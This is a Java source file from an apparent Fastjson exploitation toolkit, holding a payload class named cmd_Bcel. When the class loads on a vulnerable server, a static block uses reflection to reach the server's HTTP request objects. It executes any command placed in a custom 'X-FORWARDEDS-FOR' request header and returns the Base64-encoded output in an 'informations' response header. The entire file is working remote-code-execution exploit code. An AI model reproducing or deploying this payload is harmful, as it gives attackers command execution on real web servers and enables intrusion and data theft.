package com.fastjsontool.exploit.payload;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.*;

public class cmd_Bcel {
    private static Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while(var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    static {
        try {
            boolean var0 = false;
            Thread[] var1 = (Thread[])((Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads"));

            for(int var2 = 0; var2 < var1.length; ++var2) {
                Thread var3 = var1[var2];
                if (var3 != null) {
                    String var4 = var3.getName();
                    if (!var4.contains("exec") && var4.contains("http")) {
                        Object var5 = getFV(var3, "target");
                        if (var5 instanceof Runnable) {
                            try {
                                var5 = getFV(getFV(getFV(var5, "this$0"), "handler"), "global");
                            } catch (Exception var11) {
                                continue;
                            }

                            List var6 = (List)getFV(var5, "processors");

                            for(int var7 = 0; var7 < var6.size(); ++var7) {
                                Object var8 = var6.get(var7);
                                var5 = getFV(var8, "req");
                                Object var9 = var5.getClass().getMethod("getResponse").invoke(var5);

                                var4 = (String)var5.getClass().getMethod("getHeader", String.class).invoke(var5, new String("X-FORWARDEDS-FOR"));
                                if (var4 != null && !var4.isEmpty()) {
                                    var9.getClass().getMethod("setStatus", Integer.TYPE).invoke(var9, new Integer(200));
                                    Runtime runtime = Runtime.getRuntime();
                                    String[] commonds = var4.split("\\s+");
                                    Process exec = runtime.exec(commonds);
                                    exec.waitFor();
                                    InputStream inputStream = exec.getInputStream();
                                    byte[] bytes = new byte[1024];
                                    int len = 0;
                                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                                    while ((len = inputStream.read(bytes)) != -1) {
                                        outputStream.write(bytes, 0, len);
                                    }
                                    byte[] encode = Base64.getEncoder().encode(outputStream.toByteArray());
                                    if (encode.length > 0) {
                                        var9.getClass().getMethod("addHeader", String.class, String.class).invoke(var9, new String("informations"), new String(encode));
                                    }else{
                                        var9.getClass().getMethod("addHeader", String.class, String.class).invoke(var9, new String("informations"), "execError");
                                    }
                                    var0 = true;
                                }else {
                                    var9.getClass().getMethod("setStatus", Integer.TYPE).invoke(var9, new Integer(200));
                                    var9.getClass().getMethod("addHeader", String.class, String.class).invoke(var9, new String("informations"), "fastjson");
                                    var0 = true;
                                }
                                if (var0) {
                                    break;
                                }
                            }

                            if (var0) {
                                break;
                            }
                        }
                    }
                }
            }
        } catch (Exception var12) {
        }
    }

}
